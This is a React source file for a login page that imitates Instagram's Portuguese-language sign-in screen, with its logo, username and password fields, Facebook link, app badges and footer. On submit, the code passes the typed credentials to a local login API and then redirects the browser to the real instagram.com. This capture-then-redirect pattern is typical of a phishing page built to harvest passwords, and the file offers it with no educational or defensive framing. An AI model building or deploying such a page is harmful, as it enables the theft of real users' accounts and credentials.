import React, { useState } from 'react';
import { login } from './api';
import './css/style.css';
import { useNavigate } from 'react-router-dom';



function App() {
  const navigate = useNavigate();
  const [loginData, setLoginData] = useState({ login: '', password: '' });
  const [error, setError] = useState('');

  const handleLoginChange = (e) => {
    const { name, value } = e.target;
    setLoginData({ ...loginData, [name]: value });
  };

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    const response = await login(loginData);
    if (response.error) {
      setError(response.error);
    } else {
      setError('');
      window.location.replace('https://www.instagram.com')
    }
  };

  return (
    <div>
      <main>
        <div className="log-in-container">
          <div className="log-in">
            <img src={require('./photos/logo.png')} className="logo" />



            <form className="log-in-form" onSubmit={handleLoginSubmit}>

              <input type="text" name="login" value={loginData.login} onChange={handleLoginChange}
                placeholder="Telefone, nome de usuário ou email" required />
              <input type="password" name="password" value={loginData.password} onChange={handleLoginChange}
                placeholder="Senha" required />
              <button className="log-in-button" type="submit">Entrar</button>
            </form>




            <span className="or-divider">OU</span>

            <div className="fb-login">
              <a href="#">
                <img src={require('./photos/facebook-icon.png')}/><span className="facebook">Entrar com o Facebook</span></a>
            </div>

            <a href="#">Esqueci a senha</a>
          </div>

          <div className="sign-up">
            <span>Não tem uma conta?
              <a href="#"> Cadastre-se</a>
            </span>
          </div>

          <div className="get-the-app">
            <span>Obtenha o aplicativo</span>
            <div className="app-images">
              <a href="#"><img src={require('./photos/applestore.png')} /></a>
              <a href="#"><img src={require('./photos/googlestore.png')} /></a>
            </div>
          </div>

        </div>

        <div className="phones-container">
          <img src={require('./photos/iphone-novo')} />
        </div>
      </main>
      <footer>
        <ul className="flex flex-wrap justify-content-center footer-links">
          <li><a href="#">SOBRE</a></li>
          <li><a href="#">AJUDA</a></li>
          <li><a href="#">THREDS</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">JOBS</a></li>
          <li><a href="#">PRIVACIDADE</a></li>
          <li><a href="#">TERMOS</a></li>
          <li><a href="#">LOCALIZAÇÃO</a></li>
          <li><a href="#">TOP</a></li>
          <li><a href="#">CONTAS</a></li>
          <li><a href="#">HASHTAGS</a></li>
          <li><a href="#">LINGUAGEM</a></li>
        </ul>
        <span className="copyright">&copy; 2025 INSTAGRAM DO FACEBOOK</span>
      </footer>
    </div>
  )
}

  export default App;
